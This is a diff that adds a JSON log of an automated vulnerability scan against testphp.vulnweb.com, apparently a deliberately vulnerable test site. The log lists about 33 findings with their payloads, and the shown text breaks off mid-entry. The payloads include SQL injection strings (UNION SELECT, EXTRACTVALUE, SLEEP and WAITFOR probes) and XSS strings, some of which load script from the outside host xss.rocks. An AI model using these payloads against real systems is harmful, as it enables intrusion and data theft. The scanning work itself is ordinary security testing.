@@ -1,0 +1,5113 @@
+{
+  "target": "http://testphp.vulnweb.com/",
+  "scan_start": "2026-02-07 16:21:08",
+  "vulnerabilities": [
+    {
+      "id": 1,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/search.php?test=query",
+      "parameter": "searchFor",
+      "payload": "\"",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "searchFor"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4732
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:21:09",
+        "unix_timestamp": 1770477669
+      }
+    },
+    {
+      "id": 2,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/guestbook.php",
+      "parameter": "text",
+      "payload": "' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "text"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5390
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:20",
+        "unix_timestamp": 1770477740
+      }
+    },
+    {
+      "id": 3,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/guestbook.php",
+      "parameter": "text",
+      "payload": "' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "text"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5390
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:21",
+        "unix_timestamp": 1770477741
+      }
+    },
+    {
+      "id": 4,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "uname",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "uname"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:50",
+        "unix_timestamp": 1770477770
+      }
+    },
+    {
+      "id": 5,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "uname",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "uname"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:50",
+        "unix_timestamp": 1770477770
+      }
+    },
+    {
+      "id": 6,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "uname",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "uname"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:51",
+        "unix_timestamp": 1770477771
+      }
+    },
+    {
+      "id": 7,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "uname",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "uname"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:53",
+        "unix_timestamp": 1770477773
+      }
+    },
+    {
+      "id": 8,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "uname",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "uname"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:22:54",
+        "unix_timestamp": 1770477774
+      }
+    },
+    {
+      "id": 9,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "pass",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pass"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:05",
+        "unix_timestamp": 1770477785
+      }
+    },
+    {
+      "id": 10,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "pass",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pass"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:05",
+        "unix_timestamp": 1770477785
+      }
+    },
+    {
+      "id": 11,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "pass",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pass"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:05",
+        "unix_timestamp": 1770477785
+      }
+    },
+    {
+      "id": 12,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "pass",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pass"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:07",
+        "unix_timestamp": 1770477787
+      }
+    },
+    {
+      "id": 13,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/userinfo.php",
+      "parameter": "pass",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "pass"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5523
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:09",
+        "unix_timestamp": 1770477789
+      }
+    },
+    {
+      "id": 14,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2194
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:55",
+        "unix_timestamp": 1770477835
+      }
+    },
+    {
+      "id": 15,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2144
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:55",
+        "unix_timestamp": 1770477835
+      }
+    },
+    {
+      "id": 16,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2148
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:55",
+        "unix_timestamp": 1770477835
+      }
+    },
+    {
+      "id": 17,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2149
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:56",
+        "unix_timestamp": 1770477836
+      }
+    },
+    {
+      "id": 18,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2165
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:57",
+        "unix_timestamp": 1770477837
+      }
+    },
+    {
+      "id": 19,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2147
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:57",
+        "unix_timestamp": 1770477837
+      }
+    },
+    {
+      "id": 20,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2160
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:57",
+        "unix_timestamp": 1770477837
+      }
+    },
+    {
+      "id": 21,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "1' AND '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2151
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:58",
+        "unix_timestamp": 1770477838
+      }
+    },
+    {
+      "id": 22,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "1' AND SLEEP(5)--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2155
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:59",
+        "unix_timestamp": 1770477839
+      }
+    },
+    {
+      "id": 23,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "1' ORDER BY 1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2153
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:23:59",
+        "unix_timestamp": 1770477839
+      }
+    },
+    {
+      "id": 24,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "1' ORDER BY 10--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2154
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:00",
+        "unix_timestamp": 1770477840
+      }
+    },
+    {
+      "id": 25,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2150
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:00",
+        "unix_timestamp": 1770477840
+      }
+    },
+    {
+      "id": 26,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "admin'--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2142
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:00",
+        "unix_timestamp": 1770477840
+      }
+    },
+    {
+      "id": 27,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<IMG SRC= onmouseover=\"alert('xxs')\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2177
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:01",
+        "unix_timestamp": 1770477841
+      }
+    },
+    {
+      "id": 28,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2186
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:01",
+        "unix_timestamp": 1770477841
+      }
+    },
+    {
+      "id": 29,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2186
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:02",
+        "unix_timestamp": 1770477842
+      }
+    },
+    {
+      "id": 30,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2186
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:02",
+        "unix_timestamp": 1770477842
+      }
+    },
+    {
+      "id": 31,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<IMG onmouseover=\"alert('xxs')\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2172
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:02",
+        "unix_timestamp": 1770477842
+      }
+    },
+    {
+      "id": 32,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<SCRIPT \"a='>'\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2195
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:03",
+        "unix_timestamp": 1770477843
+      }
+    },
+    {
+      "id": 33,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
+      "parameter": "cat",
+      "payload": "<SCRIPT a=\">\" '' SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5"
+        },
+        "body_parameter": "cat"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 2196
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 16:24:03",
+        "unix_timestamp": 1770477843
+      }
+    },
+    {
+      "id": 34,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://testphp.vulnweb.com/listproducts.php",
